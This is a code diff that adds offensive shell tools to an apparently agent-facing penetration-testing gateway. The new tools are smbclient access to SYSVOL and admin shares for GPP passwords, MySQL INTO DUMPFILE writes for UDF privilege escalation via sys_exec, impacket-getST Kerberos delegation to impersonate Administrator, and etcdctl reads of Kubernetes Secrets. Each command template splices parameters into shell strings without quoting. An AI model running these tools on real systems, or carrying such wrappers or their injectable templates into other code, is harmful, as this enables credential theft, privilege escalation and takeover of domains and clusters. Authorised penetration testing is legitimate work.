@@ -649,6 +649,23 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=60,
     )
 
+    # ── SMB Client: file read/write on SMB shares ──────────────────
+    gateway.register_shell_tool(
+        name="smb_client",
+        command_template="smbclient -U {domain}/{user}%{password} //{host}/{share} -c \"{command}\" 2>&1",
+        description="Access SMB/CIFS shares for file read/write operations. Use for reading SYSVOL (GPP/cpassword), accessing shared folders, and downloading files from Windows/AD hosts. For share enumeration use smbmap_enum first. Command examples: 'ls', 'get Groups.xml /tmp/out.xml', 'put local_file remote_path'.",
+        parameters={
+            "domain": {"type": "string", "description": "Domain name (use 'WORKGROUP' for non-domain hosts)"},
+            "user": {"type": "string", "description": "Username"},
+            "password": {"type": "string", "description": "Password"},
+            "host": {"type": "string", "description": "SMB server IP or hostname"},
+            "share": {"type": "string", "description": "Share name (e.g. SYSVOL, C$, IPC$)"},
+            "command": {"type": "string", "description": "smbclient command: 'ls', 'get <remote_file> <local_path>', 'put <local_file> <remote_path>', 'cd <dir>', 'prompt OFF; mget *'"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
     # ── Knowledge search (DarwinRAG + keyword fallback) ──────────
     async def knowledge_search(query: str, category: str = "") -> ToolResult:
         """Search penetration testing knowledge base for exploit patterns.
@@ -1028,6 +1045,25 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "query": {"type": "string", "description": "SQL query to execute"},
         },
     )
+
+    # ── MySQL File Write (UDF / INTO DUMPFILE) ─────────────────────
+
+    gateway.register_shell_tool(
+        name="mysql_file_write",
+        command_template="echo 'SELECT 0x{hex_content} INTO DUMPFILE \"{file_path}\"' | mysql -h {host} -P {port} -u {user} -p'{password}' 2>&1",
+        description="Write a binary file to the MySQL server's filesystem via SELECT ... INTO DUMPFILE. Use for MySQL UDF privilege escalation: write a compiled UDF shared library (.so) to the plugin directory, then CREATE FUNCTION sys_exec to execute commands. Requires FILE privilege and write access to the target path. Use mysql_query first to check @@plugin_dir and @@secure_file_priv.",
+        parameters={
+            "host": {"type": "string", "description": "MySQL host IP or hostname"},
+            "port": {"type": "integer", "description": "MySQL port (default 3306)"},
+            "user": {"type": "string", "description": "Database username"},
+            "password": {"type": "string", "description": "Database password"},
+            "file_path": {"type": "string", "description": "Absolute path on the MySQL server to write the file to (e.g. /usr/lib/mysql/plugin/udf.so)"},
+            "hex_content": {"type": "string", "description": "Hex-encoded binary content to write (the compiled .so as hex string)"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
     gateway.register_shell_tool(
         name="oracle_query",
         command_template="printf '%s\n' '{query}' | sqlplus -S {user}/{password}@//{host}:{port}/{sid} 2>&1",
@@ -1176,6 +1212,21 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         },
         parser=_parse_shell_output,
         timeout=30,
+    )
+
+    # ── S4U2Self/S4U2Proxy Constrained Delegation ─────────────────
+
+    gateway.register_shell_tool(
+        name="impacket_getST",
+        command_template="impacket-getST -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
+        description="S4U2Self/S4U2Proxy Constrained Delegation: request a service ticket on behalf of another user via Kerberos constrained delegation. Use when a service account has msDS-AllowedToDelegateTo configured. Target format: DOMAIN/USER:PASSWORD@DC_IP.",
+        parameters={
+            "spn": {"type": "string", "description": "Target service SPN (e.g. 'ldap/dc01.domain.local', 'cifs/dc01.domain.local')"},
+            "target_user": {"type": "string", "description": "User to impersonate (e.g. 'Administrator')"},
+            "target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP for authentication"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
     )
 
     # ── Tomcat Exploitation ────────────────────────────────────────
@@ -1672,10 +1723,12 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="etcdctl_get",
-        command_template="ETCDCTL_API=3 etcdctl --endpoints={endpoint} get / --prefix --keys-only 2>&1 | head -100",
-        description="Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. Use after discovering etcd endpoint (port 2379). Requires network access to etcd.",
+        command_template="ETCDCTL_API=3 etcdctl --endpoints={endpoint} get {key} {output_opts} 2>&1 | head -200",
+        description="Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. Use '--prefix --keys-only' for exploration (key discovery), or specify a specific key with '-o json' to read its full value (including base64-encoded Secret data). Requires network access to etcd (port 2379).",
         parameters={
-            "endpoint": {"type": "string", "description": "etcd endpoint (e.g. 'https://10.0.0.1:2379')"},
+            "endpoint": {"type": "string", "description": "etcd endpoint (e.g. 'http://localhost:11379', 'https://10.0.0.1:2379')"},
+            "key": {"type": "string", "description": "etcd key to read. Use '/' with --prefix for all keys, or a specific path like '/registry/secrets/namespace/secretname'"},
+            "output_opts": {"type": "string", "description": "Additional etcdctl options. Use '--prefix --keys-only' for key discovery, '-o json' for full value output of a specific key, '--prefix -o json' for all keys with values"},
         },
         parser=_parse_shell_output,
         timeout=30,
